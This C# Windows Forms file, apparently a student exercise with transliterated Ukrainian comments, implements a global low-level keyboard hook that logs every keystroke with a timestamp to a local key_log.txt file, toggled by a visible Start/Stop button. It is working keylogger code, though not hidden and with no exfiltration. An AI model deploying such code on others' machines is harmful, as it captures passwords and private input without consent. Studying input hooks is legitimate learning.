using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Legacy_Code_Practies_work_7
{
    // ZAVDANNYA 1

    public partial class Form1 : Form
    {
        // Delegate - ce tup dannykh dlya funkcij callback
        // Vikorystovuemo jogo dlya hook callback funkcij
        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        // Konstanty dlya keyboard hooka
        // WH_KEYBOARD_LL = 13 - ce kod dlya global keyboard hooka
        private const int WH_KEYBOARD_LL = 13;
        // WM_KEYDOWN = 0x0100 - ce kod podiji koly klavishu natyskayut
        private const int WM_KEYDOWN = 0x0100;

        // Zminnye dlya hooka
        // proc - ce nascha callback funkciya sho bude vyskyvana koly natyskayut klavishu
        private static HookProc proc = HookCallback;
        // hookId - ce ID hooka, treba jogo dlya vyklyuchennya hooka
        private static IntPtr hookId = IntPtr.Zero;
        // loggingEnabled - flag sho pokazuye chy vkljuchene loguvannya
        private static bool loggingEnabled = false;

        public Form1()
        {
            InitializeComponent();
        }

        // Podiya koly forma zavantuetsya
        private void Form1_Load(object sender, EventArgs e)
        {
            knopka_start.Text = "Start Logging";
            textBox_vuvid.Text = "";
        }

        // Podiya koly klykaem na knopku
        private void knopka_start_Click(object sender, EventArgs e)
        {
            // Kliknuv na knopku - vklyuchuemo abo vyklyuchuemo loguvannya
            if (!loggingEnabled)
            {
                // Yakscho loguvannya vimknene - zapuskuemo hook
                loggingEnabled = true;
                // Vstanovlyuyemo hook i berem jogo ID
                hookId = SetHook(proc);
                // Zminyuyemo tekst knopky na "Stop Logging"
                knopka_start.Text = "Stop Logging";
                // Dodayemo povidomlennya u textBox
                textBox_vuvid.AppendText("[Logging Started]\n");
            }
            else
            {
                // Yakscho loguvannya vkljuchene - zupynyaemo hook
                loggingEnabled = false;
                // Vyklyuchaemo hook po jogo ID
                UnhookWindowsHookEx(hookId);
                // Zminyuyemo tekst knopky na "Start Logging"
                knopka_start.Text = "Start Logging";
                // Dodayemo povidomlennya u textBox
                textBox_vuvid.AppendText("[Logging Stopped]\n");
            }
        }

        // Funkciya dlya vstanovlennya hooka
        // Berem callback funkciju i regestruemo yiy v systemi
        private static IntPtr SetHook(HookProc proc)
        {
            // Berem iformation pro aktualnuy proces (nashu programu)
            using (Process curProcess = Process.GetCurrentProcess())
            // Berem modul (DLL) procesu
            using (ProcessModule curModule = curProcess.MainModule)
            {
                // Vstanovlyuemo hook na klaviaturu i vovertayemo jogo ID
                // WH_KEYBOARD_LL - global keyboard hook
                // proc - nascha callback funkciya
                // GetModuleHandle - berem adresu modulya
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        // Callback funciya dlya perehoplennya klavish
        // Cya funkciya budet vyskana kozhnyy raz koly natyskayut klavishu
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Yakscho nCode >= 0, to ye podiya sho treba opracyuvaty
            if (nCode >= 0)
            {
                // Yakscho ye keydown podiya (natyskuvannya klavishi)
                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    // Vytyaguemo kod klavishi z parametru lParam
                    // Marshal.ReadInt32 - chytayemo 32-bitne chyslo
                    int vkCode = Marshal.ReadInt32(lParam);
                    // Konvertuemo kod v enum Keys
                    Keys key = (Keys)vkCode;

                    // Zapysuemo u fajl
                    try
                    {
                        // Vidkryvayemo fajl u ðåæèì³ dodatku (dobalyuemo na kinets)
                        using (StreamWriter writer = new StreamWriter("key_log.txt", true))
                        {
                            // Pyshumo chas i nazvu klavishi
                            writer.WriteLine($"[{DateTime.Now:HH:mm:ss}] Klavisha: {key}");
                        }
                    }
                    catch
                    {
                        // Yakscho oshibka - ignoruemo (programa ne padne)
                    }
                }
            }

            // Peredayemo dali po lancyugu - eto vazhnî!
            // Yakscho my ne peredynymo, to systema ne bude znaty pro cyu podiju
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        // DLL imports - eto funciji z Windows DLL
        // Vykorystovuyemo yikh dlya roboty z hookamy

        // SetWindowsHookEx - vstanovlyuemo hook
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        // CallNextHookEx - peredayemo podiyu dali
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        // UnhookWindowsHookEx - vyklyuchaemo hook
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        // GetModuleHandle - berem adresu modulya po imeni
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}